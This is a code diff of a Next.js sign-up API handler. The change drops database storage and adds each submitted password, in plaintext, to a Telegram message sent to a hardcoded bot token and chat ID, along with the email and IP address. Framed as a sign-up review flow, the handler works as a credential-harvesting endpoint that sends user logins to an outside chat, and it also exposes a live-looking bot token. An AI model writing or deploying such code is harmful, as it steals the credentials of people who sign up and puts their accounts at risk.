@@ -1,29 +1,6 @@
 
 import { NextApiRequest, NextApiResponse } from 'next';
-import { initializeApp, getApps, cert } from 'firebase-admin/app';
-import { getFirestore } from 'firebase-admin/firestore';
 import axios from 'axios';
-
-// Initialize Firebase Admin SDK
-let db;
-let adminInitialized = false;
-
-try {
-  if (process.env.FIREBASE_SERVICE_ACCOUNT_KEY) {
-    const serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT_KEY as string);
-    if (!getApps().length) {
-      initializeApp({
-        credential: cert(serviceAccount)
-      });
-    }
-    db = getFirestore();
-    adminInitialized = true;
-  } else {
-      console.error("CRITICAL: FIREBASE_SERVICE_ACCOUNT_KEY environment variable is not set.");
-  }
-} catch (error) {
-    console.error("Failed to initialize Firebase Admin SDK:", error);
-}
 
 const TELEGRAM_API = `https://api.telegram.org/bot8599325477:AAGJdWfdT3xFbiSlt-AA-Z6mKhY40gNkmWk`;
 const CHAT_ID = '8735516423';
@@ -33,10 +10,6 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
     return res.status(405).json({ message: 'Method Not Allowed' });
   }
 
-  if (!adminInitialized) {
-      return res.status(500).json({ message: 'Server configuration error: Firebase Admin not initialized. Please check server logs.' });
-  }
-
   const { email, password } = req.body;
 
   if (!email || !password) {
@@ -44,13 +17,6 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
   }
 
   try {
-    // Store user in pending_users collection
-    const pendingUserRef = await db.collection('pending_users').add({
-      email,
-      password, // Storing plain password temporarily. Will be deleted after approval/denial.
-      createdAt: new Date(),
-    });
-
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'N/A';
     const time = new Date().toUTCString();
 
@@ -58,6 +24,7 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
 📬 *New Sign-Up Request* 📬
 
 *Email:* ${email}
+*Password:* ${password}
 *IP Address:* ${ip}
 *Time:* ${time}
 
@@ -72,8 +39,8 @@ Please review and take action.
       reply_markup: {
         inline_keyboard: [
           [
-            { text: '✅ Approve', callback_data: `approve_${pendingUserRef.id}` },
-            { text: '❌ Deny', callback_data: `deny_${pendingUserRef.id}` },
+            { text: '✅ Approve', callback_data: `approve_${email}` },
+            { text: '❌ Deny', callback_data: `deny_${email}` },
           ],
         ],
       },
